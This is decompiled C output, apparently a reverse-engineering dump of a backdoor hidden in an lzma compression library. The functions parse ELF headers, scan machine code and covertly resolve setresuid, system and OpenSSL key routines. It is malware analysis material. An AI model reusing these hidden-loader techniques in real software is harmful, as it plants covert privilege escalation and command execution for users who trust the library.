long _Llzma_auto_decode_1
               (undefined8 param_1,undefined4 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  long lVar2;
  long lVar3;
  undefined4 local_2c;
  
  local_2c = param_2;
  iVar1 = _Llzma_index_iter_rewind_cold(0xd2,4,0xd,0);
  if (iVar1 != 0) {
    lVar2 = 0;
    while (lVar2 = _Llzip_decode_0(param_1,&local_2c,lVar2), lVar2 != 0) {
      lVar3 = _Lstream_encode_1(param_3,param_4,lVar2);
      if (lVar3 != 0) {
        return lVar3;
      }
      lVar2 = lVar2 + 1;
    }
  }
  return 0;
}



undefined8
FUN_00103320(ulong param_1,ulong param_2,long param_3,ulong param_4,ulong *param_5,
            undefined8 param_6)

{
  byte bVar1;
  int iVar2;
  ulong uVar3;
  uint uVar4;
  long lVar5;
  byte bVar6;
  ulong uVar7;
  ulong uVar8;
  long *plVar9;
  byte bVar10;
  byte bVar11;
  long local_d8;
  long local_d0;
  undefined2 local_c8;
  byte local_bd;
  undefined4 local_bc;
  byte local_b8;
  uint local_b0;
  long local_a8;
  long local_98;
  long local_80;
  long local_78;
  undefined2 local_70;
  char local_65;
  uint local_64;
  byte local_60;
  int local_58;
  long local_50;
  
  bVar11 = 0;
  plVar9 = &local_d8;
  for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
    *(undefined4 *)plVar9 = 0;
    plVar9 = (long *)((long)plVar9 + 4);
  }
  *param_5 = 0;
  uVar3 = _Llzma_auto_decode_1(param_6,0x1e0,param_3,param_4);
  if (uVar3 != 0) {
    while (uVar3 < param_4) {
      iVar2 = code_dasm(&local_d8,uVar3,param_4);
      if (iVar2 == 0) {
        uVar3 = uVar3 + 1;
      }
      else {
        if ((local_b0 & 0xfffffffd) == 0xb1) {
          if (local_bc._1_1_ == '\x03') {
            if (((local_c8 & 0x20) == 0) || ((local_bd & 8) == 0)) {
              bVar1 = (byte)local_c8 & 0x40;
              if ((local_c8 & 0x1040) == 0) {
                if ((local_c8 & 0x40) != 0) {
                  bVar6 = 0;
                  bVar1 = local_bc._3_1_;
                  bVar10 = 0;
                  if ((local_c8 & 0x20) != 0) {
LAB_00103430:
                    bVar1 = local_bc._3_1_ | (byte)((local_bd & 1) << 3);
                    bVar10 = bVar6;
                  }
                  goto LAB_0010343d;
                }
                bVar10 = 0;
              }
              else {
                if ((local_c8 & 0x40) == 0) {
                  bVar10 = local_c8._1_1_ & 0x10;
                  if ((local_c8 & 0x1000) == 0) goto LAB_0010344b;
                  bVar10 = local_b8;
                  if ((local_c8 & 0x20) != 0) {
                    bVar10 = local_b8 | (byte)((local_bd & 1) << 3);
                  }
                }
                else {
                  bVar1 = local_bc._3_1_;
                  bVar10 = local_bc._2_1_;
                  if ((local_c8 & 0x20) != 0) {
                    bVar6 = local_bc._2_1_ | local_bd * '\x02' & 8;
                    goto LAB_00103430;
                  }
                }
LAB_0010343d:
                if (bVar1 != bVar10) goto LAB_001033b1;
              }
LAB_0010344b:
              plVar9 = &local_80;
              for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
                *(undefined4 *)plVar9 = 0;
                plVar9 = (long *)((long)plVar9 + (ulong)bVar11 * -8 + 4);
              }
              uVar8 = local_d0 + local_d8;
              uVar4 = 0;
              while (((uVar8 < param_4 && (uVar4 < 6)) &&
                     (iVar2 = code_dasm(&local_80,uVar8,param_4), iVar2 != 0))) {
                if (local_58 == 0x109) {
                  if ((local_64 & 0xff00ff00) == 0x5000000) {
                    bVar1 = 0;
                    if ((local_70 & 0x1040) != 0) {
                      if ((local_70 & 0x40) == 0) {
                        bVar1 = local_70._1_1_ & 0x10;
                        if (((local_70 & 0x1000) != 0) && (bVar1 = local_60, (local_70 & 0x20) != 0)
                           ) {
                          bVar6 = local_65 << 3;
                          goto LAB_00103533;
                        }
                      }
                      else {
                        bVar1 = (byte)(local_64 >> 0x10);
                        if ((local_70 & 0x20) != 0) {
                          bVar6 = local_65 * '\x02';
LAB_00103533:
                          bVar1 = bVar1 | bVar6 & 8;
                        }
                      }
                    }
                    if (bVar1 == bVar10) {
                      lVar5 = 0;
                      if ((local_70 & 0x100) != 0) {
                        lVar5 = local_50 + local_80 + local_78;
                      }
                      uVar7 = lVar5 - 0x18;
                      if ((param_1 <= uVar7 && lVar5 != 0x18) && (lVar5 + 4U <= param_2))
                      goto LAB_0010363f;
                    }
                  }
                }
                else if (local_58 == 0xa5fe) break;
                uVar8 = uVar8 + local_78;
                uVar4 = uVar4 + 1;
              }
            }
          }
        }
        else if (local_b0 == 0x147) {
          if (((((local_bd & 8) == 0) && (local_bc >> 8 == 0x50000)) && ((local_c8 & 0x800) != 0))
             && (local_98 == 0)) {
            lVar5 = 0;
            if ((local_c8 & 0x100) != 0) {
              lVar5 = local_a8 + local_d8 + local_d0;
            }
            uVar7 = lVar5 - 0x18;
            if (((lVar5 + 4U <= param_2) && (param_1 <= uVar7)) && (uVar7 != 0)) {
LAB_0010363f:
              *param_5 = uVar7;
              return 1;
            }
          }
        }
        else if ((local_b0 == 0xa5fe) && (param_3 != local_d8)) {
          return 0;
        }
LAB_001033b1:
        uVar3 = uVar3 + local_d0;
      }
    }
  }
  return 0;
}



undefined8
_Llzma_buf_cpy_0(ulong param_1,ulong param_2,ulong param_3,ulong param_4,long param_5,ulong *param_6
                )

{
  int iVar1;
  uint uVar2;
  long lVar3;
  long lVar4;
  long lVar5;
  ulong *puVar6;
  long *plVar7;
  ulong uVar8;
  ulong uVar9;
  byte bVar10;
  uint uVar11;
  long local_100;
  long local_f8;
  ushort local_f0;
  byte local_e5;
  uint local_e4;
  byte local_e0;
  ulong local_d0;
  ulong local_a8 [16];
  
  *param_6 = 0;
  lVar4 = *(long *)(param_5 + 8);
  if (lVar4 == 0) {
    return 0;
  }
  uVar11 = 0xff;
  uVar8 = 0;
  bVar10 = 0;
  puVar6 = local_a8;
  for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)puVar6 = 0;
    puVar6 = (ulong *)((long)puVar6 + 4);
  }
  plVar7 = &local_100;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)plVar7 = 0;
    plVar7 = (long *)((long)plVar7 + 4);
  }
LAB_001036cb:
  do {
    if ((param_4 <= param_3) || (iVar1 = _Llzma_optimum_normal_0(param_3,param_4,lVar4), iVar1 == 0)
       ) goto LAB_001037e2;
    param_3 = local_f8 + local_100;
    iVar1 = _Llzma_properties_size_0(param_3,param_3 + 0x20,&local_100,0x109,0);
  } while (iVar1 == 0);
  if ((local_f0 & 0x1040) == 0) {
LAB_00103768:
    if ((char)uVar11 != '\0') {
      param_3 = local_f8 + local_100;
      goto LAB_001036cb;
    }
  }
  else {
    if ((local_f0 & 0x40) != 0) {
      uVar11 = local_e4 >> 0x10 & 0xff;
      if ((local_f0 & 0x20) != 0) {
        uVar2 = (uint)local_e5 * 2;
LAB_00103762:
        uVar11 = uVar11 | uVar2 & 8;
      }
      goto LAB_00103768;
    }
    if ((local_f0 & 0x1000) != 0) {
      uVar11 = (uint)local_e0;
      if ((local_f0 & 0x20) != 0) {
        uVar2 = (uint)local_e5 << 3;
        goto LAB_00103762;
      }
      goto LAB_00103768;
    }
  }
  if (((local_f0 & 0x100) != 0) && (uVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)) {
    uVar8 = local_d0 + local_100 + local_f8;
  }
  if ((param_1 <= uVar8) && (uVar8 < param_2)) {
    uVar9 = (ulong)bVar10;
    bVar10 = bVar10 + 1;
    local_a8[uVar9] = uVar8;
    if (0xf < bVar10) {
LAB_001037e2:
      lVar4 = 0;
      do {
        if ((uint)bVar10 <= (uint)lVar4) {
          return 0;
        }
        lVar3 = 0;
        do {
          lVar5 = 0;
          do {
            if ((local_a8[lVar4] == local_a8[lVar3] - 8) && (local_a8[lVar3] == local_a8[lVar5] - 8)
               ) {
              *param_6 = local_a8[lVar4];
              return 1;
            }
            lVar5 = lVar5 + 1;
          } while ((uint)lVar5 < (uint)bVar10);
          lVar3 = lVar3 + 1;
        } while ((uint)lVar3 < (uint)bVar10);
        lVar4 = lVar4 + 1;
      } while( true );
    }
  }
  uVar11 = 0;
  param_3 = local_f8 + local_100;
  goto LAB_001036cb;
}



char _Llzma_check_finish_0(long param_1,undefined8 param_2,long param_3)

{
  long lVar1;
  undefined8 uVar2;
  int iVar3;
  long lVar4;
  long *plVar5;
  char cVar6;
  byte bVar7;
  long local_80;
  long local_78;
  
  bVar7 = 0;
  cVar6 = '\0';
  lVar1 = *(long *)(param_3 + 0x28);
  if (lVar1 != 0) {
    uVar2 = *(undefined8 *)(param_3 + 0x30);
    iVar3 = _Lstream_encoder_mt_init_1(lVar1,uVar2,0,param_1);
    cVar6 = iVar3 != 0;
    plVar5 = &local_80;
    for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
      *(undefined4 *)plVar5 = 0;
      plVar5 = (long *)((long)plVar5 + (ulong)bVar7 * -8 + 4);
    }
    iVar3 = _Lstream_encoder_mt_init_1(lVar1,uVar2,&local_80,param_1 + 0x10);
    if (iVar3 != 0) {
      iVar3 = _Lstream_encoder_mt_init_1(local_78 + local_80,uVar2,0,param_1 + 0x10);
      if (iVar3 == 0) {
        cVar6 = cVar6 + '\x01';
      }
      else {
        cVar6 = cVar6 + '\x02';
      }
    }
  }
  return cVar6;
}



undefined  [16]
_Llzma_decoder_init_1(long param_1,undefined8 param_2,long param_3,undefined8 param_4)

{
  long lVar1;
  undefined8 uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  undefined auVar7 [16];
  
  uVar6 = 0;
  lVar1 = *(long *)(param_3 + 0x48);
  if (lVar1 != 0) {
    uVar2 = *(undefined8 *)(param_3 + 0x50);
    iVar3 = _Lstream_encoder_mt_init_1(lVar1,uVar2,0,param_1);
    iVar4 = _Lstream_encoder_mt_init_1(lVar1,uVar2,0,param_1 + 0x10);
    iVar5 = _Lstream_encoder_mt_init_1(lVar1,uVar2,0,param_1 + 8);
    uVar6 = (((uint)(iVar3 != 0) - (uint)(iVar4 == 0)) + 2) - (uint)(iVar5 == 0);
  }
  auVar7._4_4_ = 0;
  auVar7._0_4_ = uVar6;
  auVar7._8_8_ = param_4;
  return auVar7;
}



undefined  [16] _Llzma_delta_coder_init_1(undefined8 param_1,undefined8 param_2,ulong param_3)

{
  undefined auVar1 [16];
  int iVar2;
  undefined8 uVar3;
  undefined auVar4 [16];
  
  if (*(long *)(param_3 + 0x68) != 0) {
    iVar2 = _Lstream_encoder_mt_init_1
                      (*(long *)(param_3 + 0x68),*(undefined8 *)(param_3 + 0x70),0,param_1);
    if (iVar2 == 0) {
      uVar3 = 0;
    }
    else {
      uVar3 = 3;
    }
    auVar4._8_8_ = param_2;
    auVar4._0_8_ = uVar3;
    return auVar4;
  }
  auVar1._8_8_ = 0;
  auVar1._0_8_ = param_3;
  return auVar1 << 0x40;
}



ushort * _Llzma_encoder_init_0(char param_1,ushort *param_2)

{
  ushort uVar1;
  ushort uVar2;
  short sVar3;
  
  if (param_1 == '-') {
    while( true ) {
      uVar1 = *param_2;
      uVar2 = uVar1 & 0xff00;
      if ((uVar2 == 0x6400) || (sVar3 = (short)((ulong)uVar1 << 8), sVar3 == 0x6400)) break;
      if ((((uVar1 & 0xdf00) == 0) ||
          (((uVar2 == 0x900 || (uVar2 == 0x3d00)) || (((ulong)uVar1 << 8 & 0xdf00) == 0)))) ||
         ((sVar3 == 0x3d00 || (sVar3 == 0x900)))) goto LAB_001039f7;
      param_2 = param_2 + 1;
    }
  }
  else {
LAB_001039f7:
    param_2 = (ushort *)0x0;
  }
  return param_2;
}



undefined8 FUN_00103a00(undefined8 param_1,long *param_2)

{
  long lVar1;
  long *plVar2;
  int iVar3;
  long lVar4;
  long *plVar5;
  long lVar6;
  long lVar7;
  long **pplVar8;
  long local_40 [2];
  
  if (((((&stack0xfffffffffffffff8 < param_2) &&
        ((ulong)((long)param_2 - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
       (lVar1 = *param_2, lVar1 - 1U < 0x20)) &&
      ((plVar2 = (long *)param_2[1], param_2 < plVar2 && (plVar2 != (long *)0x0)))) &&
     ((ulong)((long)plVar2 - (long)param_2) < 0x4001)) {
    iVar3 = table_get(plVar2,(void *)0x0);
    lVar6 = 1;
    if (iVar3 == 0x108) {
      while (lVar7 = lVar6 + 1, lVar6 != lVar1) {
        plVar2 = (long *)param_2[lVar7];
        if (plVar2 <= param_2) {
          return 0;
        }
        if (plVar2 == (long *)0x0) {
          return 0;
        }
        if (0x4000 < (ulong)((long)plVar2 - (long)param_2)) {
          return 0;
        }
        lVar4 = _Llzma_encoder_init_0(*(undefined2 *)plVar2);
        lVar6 = lVar7;
        if (lVar4 != 0) {
          return 0;
        }
      }
      if (param_2[lVar7] == 0) {
        pplVar8 = (long **)(param_2 + lVar6 + 2);
        do {
          plVar2 = *pplVar8;
          if (plVar2 == (long *)0x0) {
            return 0;
          }
          if ((plVar2 <= param_2) || (0x4000 < (ulong)((long)plVar2 - (long)param_2))) {
            local_40[0] = 0;
            plVar5 = (long *)_Lmicrolzma_decode_0(param_1,local_40,1);
            if (plVar5 == (long *)0x0) {
              return 0;
            }
            if ((undefined2 *)(local_40[0] + (long)plVar5) < (undefined2 *)((long)plVar2 + 0x2cU)) {
              return 0;
            }
            if (plVar2 < plVar5) {
              return 0;
            }
          }
          iVar3 = table_get(*pplVar8,(void *)0x0);
          if (iVar3 != 0) {
            return 0;
          }
          pplVar8 = pplVar8 + 1;
        } while (*pplVar8 != (long *)0x0);
        return 1;
      }
    }
  }
  return 0;
}



bool FUN_00103b60(long param_1,undefined8 param_2,undefined8 param_3,long param_4)

{
  int iVar1;
  long lVar2;
  ulong uVar3;
  undefined4 *puVar4;
  long local_6a0;
  long local_698;
  long local_690;
  long local_688;
  long local_680 [4];
  undefined local_660 [16];
  undefined4 local_650 [392];
  
  puVar4 = local_650;
  for (lVar2 = 0x186; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  local_660 = ZEXT816(0);
  if ((((param_1 != 0) && (param_4 != 0)) && (lVar2 = *(long *)(param_4 + 8), lVar2 != 0)) &&
     ((*(code **)(lVar2 + 0x30) != (code *)0x0 && (*(long *)(lVar2 + 0x38) != 0)))) {
    local_6a0 = 0;
    local_698 = 0;
    local_690 = 0;
    (**(code **)(lVar2 + 0x30))(param_1,&local_6a0,&local_698,&local_690);
    local_680[3] = (**(code **)(*(long *)(param_4 + 8) + 0x38))();
    if (((local_6a0 != 0) && ((local_698 != 0 && (local_690 != 0)))) && (local_680[3] != 0)) {
      local_680[0] = local_6a0;
      local_688 = 0;
      local_680[1] = local_698;
      local_680[2] = local_690;
      if (*(long *)(param_4 + 8) != 0) {
        lVar2 = 0;
        uVar3 = 0;
        while( true ) {
          iVar1 = FUN_00107340(local_660 + uVar3,0x628 - uVar3,&local_688,local_680[lVar2],
                               *(undefined8 *)(param_4 + 8));
          if ((iVar1 == 0) || (uVar3 = uVar3 + local_688, 0x628 < uVar3)) break;
          lVar2 = lVar2 + 1;
          if (lVar2 == 4) {
            iVar1 = FUN_001072d0(local_660,uVar3,param_2,param_3,*(undefined8 *)(param_4 + 8));
            return iVar1 != 0;
          }
        }
      }
    }
  }
  return false;
}



undefined  [16]
parse_elf_invoke(long *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  char *pcVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  undefined auVar5 [16];
  
  iVar1 = parse_elf(param_1[1],*(undefined8 *)(*param_1 + 8));
  if (iVar1 != 0) {
    pcVar2 = table_lookup_multi(*(long *)(*param_1 + 8),0x2b0,0x8c0);
    if (pcVar2 != (char *)0x0) {
      puVar4 = (undefined8 *)(*(long *)(pcVar2 + 8) + **(long **)(*param_1 + 8));
      iVar1 = FUN_00103a00(*(long **)(*param_1 + 8),*puVar4);
      if (iVar1 != 0) {
        *(undefined8 *)param_1[2] = *puVar4;
        uVar3 = 1;
        goto LAB_00103d29;
      }
    }
  }
  uVar3 = 0;
LAB_00103d29:
  auVar5._8_8_ = param_4;
  auVar5._0_8_ = uVar3;
  return auVar5;
}



int _Llzma_lzma2_encoder_memusage_0
              (long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (param_1 != 0) {
    iVar1 = _Llzma_delta_coder_init_1();
    iVar2 = _Llzma_decoder_init_1(param_1,param_2,param_3,param_4);
    iVar3 = _Llzma_check_finish_0(param_1,param_2,param_3,param_4);
    return iVar3 + (iVar1 + iVar2) * 2;
  }
  return 0;
}



undefined8 _Llzma_mf_bt4_find_0(undefined8 param_1,long param_2,long param_3)

{
  int iVar1;
  long lVar2;
  long lVar3;
  long lVar4;
  uint uVar5;
  long lVar6;
  ulong uVar7;
  ulong uVar8;
  long lVar9;
  long *plVar10;
  uint *puVar11;
  byte bVar12;
  long local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  uint local_a0 [8];
  long alStack_80 [11];
  
  bVar12 = 0;
  iVar1 = _Llzma_index_iter_rewind_cold(0xda,0x14,0xf,0);
  if ((iVar1 != 0) && (local_d0 = 0, *(long *)(*(long *)(param_3 + 0x20) + 0xa8) != 0)) {
    *(undefined8 *)(param_3 + 0x48) = 0;
    lVar2 = _Lmicrolzma_decode_0(param_1,&local_d0,0);
    if (lVar2 != 0) {
      lVar9 = 0;
      lVar3 = local_d0 + lVar2;
      local_c8 = 0x500000004;
      local_c0 = 0x700000006;
      local_b8 = 0x900000008;
      local_b0 = 0xb0000000a;
      local_a8 = 0xd0000000c;
      plVar10 = alStack_80 + 1;
      for (lVar6 = 0x14; lVar6 != 0; lVar6 = lVar6 + -1) {
        *(undefined4 *)plVar10 = 0;
        plVar10 = (long *)((long)plVar10 + ((ulong)bVar12 * -2 + 1) * 4);
      }
      do {
        lVar4 = (ulong)*(uint *)((long)&local_c8 + lVar9 * 4) * 0x20 + param_2;
        lVar6 = *(long *)(lVar4 + 8);
        if (lVar6 != 0) {
          FUN_00102fd0(lVar6,*(undefined8 *)(lVar4 + 0x10),lVar2,lVar3,alStack_80 + lVar9 + 1,
                       param_3);
        }
        lVar9 = lVar9 + 1;
      } while (lVar9 != 10);
      puVar11 = local_a0;
      for (lVar2 = 10; lVar2 != 0; lVar2 = lVar2 + -1) {
        *puVar11 = 0;
        puVar11 = puVar11 + (ulong)bVar12 * -2 + 1;
      }
      lVar2 = 0;
      do {
        uVar8 = 0;
        do {
          uVar7 = uVar8 & 0xffffffff;
          if ((uint)lVar2 <= (uint)uVar8) {
            local_a0[lVar2] = local_a0[lVar2] + 1;
            goto LAB_00103ee7;
          }
          uVar8 = uVar8 + 1;
        } while (alStack_80[uVar8] != alStack_80[lVar2 + 1]);
        local_a0[uVar7] = local_a0[uVar7] + 1;
LAB_00103ee7:
        lVar2 = lVar2 + 1;
      } while (lVar2 != 10);
      uVar8 = 0;
      uVar7 = 0;
      uVar5 = 0;
      do {
        if (uVar5 < local_a0[uVar8]) {
          uVar7 = uVar8 & 0xffffffff;
          uVar5 = local_a0[uVar8];
        }
        uVar8 = uVar8 + 1;
      } while (uVar8 != 10);
      if ((4 < uVar5) && (alStack_80[uVar7 + 1] != 0)) {
        *(long *)(param_3 + 0x48) = alStack_80[uVar7 + 1];
        return 1;
      }
    }
  }
  return 0;
}



void _Llzma_stream_decoder_init_1(long param_1)

{
  *(undefined8 *)(param_1 + 0x18) = 0;
  return;
}



void get_rodata_ptr(long param_1)

{
  *(undefined8 *)(param_1 + 0x20) = 0xffffffffffff9e18;
  return;
}



void get_ehdr_address(undefined8 *param_1)

{
  long extraout_RDX;
  
  *param_1 = &_Lx86_coder_destroy;
  get_rodata_ptr();
  param_1[1] = (long *)(extraout_RDX - param_1[4]);
  param_1[2] = *(long *)(extraout_RDX - param_1[4]) >> 0x38;
  param_1[3] = 0;
  return;
}



void _Llzma_block_param_decoder_0(undefined8 param_1,int param_2)

{
  int iVar1;
  undefined8 *puVar2;
  undefined8 auStack_18 [3];
  
  iVar1 = 0;
  puVar2 = auStack_18 + 2;
  do {
    iVar1 = iVar1 + 1;
    *puVar2 = 0;
    puVar2 = puVar2 + -1;
  } while ((-(uint)(param_2 == 0) & 0xfffff098) + 0xfe8 != iVar1);
  return;
}



void _Lparse_delta_0(long param_1)

{
  *(undefined8 *)(param_1 + 0x20) = 0xffffffffffffbe20;
  return;
}



void backdoor_ctx_save(undefined8 *param_1)

{
  *param_1 = &_Lrc_read_destroy;
  param_1[2] = *(undefined8 *)(param_1[5] + 0x18);
  _Lparse_delta_0();
  _Llzma_stream_decoder_init_1();
  param_1[1] = 0;
  return;
}



long get_lzma_allocator(void)

{
  long lVar1;
  
  lVar1 = get_lzma_allocator_addr(0x21);
  return lVar1 + 8;
}



undefined8 resolve_imports(long *param_1,long *param_2,long param_3,long param_4)

{
  long *plVar1;
  int iVar2;
  uint uVar3;
  long lVar4;
  void *fn__exit;
  void *fn_setlogmask;
  void *fn_setresgid;
  long lVar5;
  char *pcVar6;
  long fn_BN_num_bits;
  long lVar7;
  void *fn_setresuid;
  long **pplVar8;
  long *plVar9;
  long lVar10;
  long **pplVar11;
  long *plVar12;
  long *plVar13;
  ctx *ctx;
  
  iVar2 = apply_one_entry_ex(0,0x6c,0x10,5);
  if (iVar2 != 0) {
    ctx = *(ctx **)(param_4 + 0x118);
    plVar13 = *(long **)(*param_1 + 0x10);
    lVar4 = get_lzma_allocator(1);
    *(undefined8 *)(lVar4 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
    fn__exit = (void *)lzma_alloc(0x8a8,lVar4);
    ctx->fn__exit = fn__exit;
    if (fn__exit != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    fn_setlogmask = (void *)lzma_alloc(0x428,lVar4);
    ctx->fn_setlogmask = fn_setlogmask;
    if (fn_setlogmask != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    fn_setresgid = (void *)lzma_alloc(0x5f0,lVar4);
    ctx->fn_setresgid = fn_setresgid;
    if (fn_setresgid != (void *)0x0) {
      ctx->num_imports = ctx->num_imports + 1;
    }
    lVar5 = get_lzma_allocator(1);
    lVar7 = *(long *)(param_1[1] + 8);
    *(undefined8 *)(lVar5 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
                    // Returns "_dl_audit_preinit"
    pcVar6 = table_lookup_multi(lVar7,0xa60,0);
    if (pcVar6 != (char *)0x0) {
      fn_BN_num_bits = lzma_alloc(0x4e0,lVar5);
      *(long *)(param_4 + 0x68) = fn_BN_num_bits;
      if (fn_BN_num_bits != 0) {
        *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
      }
      lVar7 = *(long *)(pcVar6 + 8) + **(long **)(param_1[1] + 8);
      iVar2 = process_elf_seg(*(long **)(param_1[1] + 8),lVar7,*(undefined8 *)(pcVar6 + 0x10),4);
      plVar9 = plVar13 + 300;
      if (iVar2 != 0) {
LAB_001041d0:
        if (plVar13 != plVar9) {
          lVar10 = *(long *)(param_1[1] + 0x18);
          if ((*plVar13 != *(long *)(lVar10 + 0x50)) || (plVar13[1] != *(long *)(lVar10 + 0x58)))
          goto LAB_001041cc;
          pplVar8 = (long **)0x0;
          plVar9 = (long *)0xffffffffffffffff;
          for (pplVar11 = *(long ***)(*param_1 + 0x10); pplVar11 < plVar13 + 3;
              pplVar11 = pplVar11 + 1) {
            plVar1 = *pplVar11;
            if (plVar13 + 3 <= plVar1) {
              plVar12 = plVar9;
              if (plVar13 + 0xd <= plVar9) {
                plVar12 = plVar13 + 0xd;
              }
              if (plVar1 < plVar12) {
                pplVar8 = pplVar11;
                plVar9 = plVar1;
              }
            }
          }
          if (plVar9 != (long *)0xffffffffffffffff) {
            *(undefined8 *)(lVar4 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
            fn_setresuid = (void *)lzma_alloc(0xab8,lVar4);
            ctx->fn_setresuid = fn_setresuid;
            if (fn_setresuid != (void *)0x0) {
              ctx->num_imports = ctx->num_imports + 1;
            }
            pplVar11 = *(long ***)(*param_1 + 0x10);
            lVar10 = (long)plVar9 - (long)pplVar11;
            uVar3 = (int)pplVar11 - (int)pplVar8;
            if (pplVar11 <= pplVar8) {
              uVar3 = (int)pplVar8 - (int)pplVar11;
            }
            *(ulong *)(param_3 + 0xf8) = (ulong)uVar3 + *(long *)(*param_1 + 0x18);
            iVar2 = _Llzma_raw_encoder_0(lVar7,lVar7 + *(long *)(pcVar6 + 0x10),lVar10);
            if (iVar2 == 0) {
              return 0;
            }
            iVar2 = _Llzma_raw_encoder_0
                              (*(long *)(param_3 + 0x100),
                               *(long *)(param_3 + 0x108) + *(long *)(param_3 + 0x100),lVar10);
            if (iVar2 == 0) {
              return 0;
            }
            *(undefined8 *)(lVar4 + 0x10) = *(undefined8 *)(param_1[1] + 0x10);
            fn_setresuid = (void *)lzma_alloc(0x9f8,lVar4);
            ctx->fn_system = fn_setresuid;
            if (fn_setresuid != (void *)0x0) {
              ctx->num_imports = ctx->num_imports + 1;
            }
            fn_setresuid = (void *)lzma_alloc(0x760,lVar4);
            ctx->fn_shutdown = fn_setresuid;
            if (fn_setresuid != (void *)0x0) {
              ctx->num_imports = ctx->num_imports + 1;
            }
            *(undefined8 *)(lVar5 + 0x10) = *(undefined8 *)(param_1[1] + 0x20);
            *param_2 = lVar10;
            return 1;
          }
        }
      }
      lzma_free(*(undefined8 *)(param_4 + 0x68),lVar5);
    }
  }
  return 0;
LAB_001041cc:
  plVar13 = plVar13 + 1;
  goto LAB_001041d0;
}



undefined8 _Llzma_filter_flags_decode_0(long *param_1,long *param_2,long param_3,ctx2 *ctx2)

{
  long lVar1;
  int iVar2;
  char *pcVar3;
  long lVar4;
  char *pcVar5;
  long lVar6;
  ulong uVar7;
  long lVar8;
  void *fn_EVP_MD_CTX_free;
  int *piVar9;
  void *fn_DSA_get0_pub_key;
  long *plVar10;
  void *pvVar11;
  ulong uVar12;
  int *piVar13;
  byte bVar14;
  undefined4 local_8c;
  long local_88;
  long local_80;
  long local_78;
  byte local_6f;
  byte local_65;
  uint local_64;
  int *local_50;
  byte local_30;
  
  bVar14 = 0;
  local_8c = 0;
  local_88 = 0;
                    // Returns "_rtld_global_ro"
  pcVar3 = table_lookup_multi((long)param_1,0xa98,0);
  if (pcVar3 != (char *)0x0) {
    local_8c = 0x6a8;
    lVar4 = _Llzip_decode_0(param_1,&local_8c,0);
    if (lVar4 != 0) {
                    // Returns "DSA_get0_pqg"
      pcVar5 = table_lookup_multi((long)param_2,0x9d0,0);
      lVar6 = _Llzma_check_update_0(param_1,&local_88);
      if ((lVar6 != 0) && (uVar7 = _Lstream_encode_1(lVar6,local_88 + lVar6,lVar4), uVar7 != 0)) {
        if (pcVar5 != (char *)0x0) {
          lVar4 = *(long *)(pcVar5 + 8);
          lVar6 = *param_2;
          (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
          ctx2->field48_0x30 = lVar4 + lVar6;
        }
        plVar10 = &local_80;
        for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
          *(undefined4 *)plVar10 = 0;
          plVar10 = (long *)((long)plVar10 + (ulong)bVar14 * -8 + 4);
        }
        lVar4 = *(long *)(pcVar3 + 8);
        lVar6 = *param_1;
        lVar1 = *(long *)(pcVar3 + 0x10);
        lVar8 = get_lzma_allocator(1);
        *(long **)(lVar8 + 0x10) = param_2;
        fn_EVP_MD_CTX_free = (void *)lzma_alloc(0xd10,lVar8);
        ctx2->fn_EVP_MD_CTX_free = fn_EVP_MD_CTX_free;
        if (fn_EVP_MD_CTX_free != (void *)0x0) {
          (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
        }
        piVar13 = (int *)0x0;
        uVar12 = uVar7 - 0x80;
        while (uVar12 < uVar7) {
          iVar2 = _Llzma_properties_size_0(uVar12,uVar7,&local_80,0x10b,0);
          uVar12 = uVar12 + 1;
          if (iVar2 != 0) {
            if ((local_6f & 1) != 0) {
              piVar9 = local_50;
              if ((local_64 & 0xff00ff00) == 0x5000000) {
                piVar9 = (int *)((long)local_50 + local_78 + local_80);
              }
              if ((((local_65 & 0x48) != 0x48) && ((int *)(lVar4 + lVar6) < piVar9)) &&
                 (piVar9 + 1 <= (int *)((long)(int *)(lVar4 + lVar6) + lVar1))) {
                piVar13 = piVar9;
              }
            }
            uVar12 = local_80 + 1 + (ulong)local_30;
          }
        }
        if ((piVar13 == (int *)0x0) ||
           (iVar2 = _Llzma_properties_size_0
                              (*(long *)(param_3 + 0x100),
                               *(long *)(param_3 + 0x108) + *(long *)(param_3 + 0x100),0,0x10b,
                               piVar13), iVar2 == 0)) {
          pvVar11 = ctx2->fn_EVP_MD_CTX_free;
        }
        else {
          fn_DSA_get0_pub_key = (void *)lzma_alloc(0x468,lVar8);
          ctx2->fn_DSA_get0_pub_key = fn_DSA_get0_pub_key;
          if (fn_DSA_get0_pub_key != (void *)0x0) {
            (ctx2->ctx).num_imports = (ctx2->ctx).num_imports + 1;
          }
          if ((*piVar13 == 0) && (*(long *)(piVar13 + -2) == 0)) {
            *(int **)(param_3 + 0x78) = piVar13;
            *(int **)(param_3 + 0x70) = piVar13 + -2;
            return 1;
          }
          lzma_free(ctx2->fn_EVP_MD_CTX_free,lVar8);
          pvVar11 = ctx2->fn_DSA_get0_pub_key;
        }
        lzma_free(pvVar11,lVar8);
      }
    }
  }
  return 0;
}



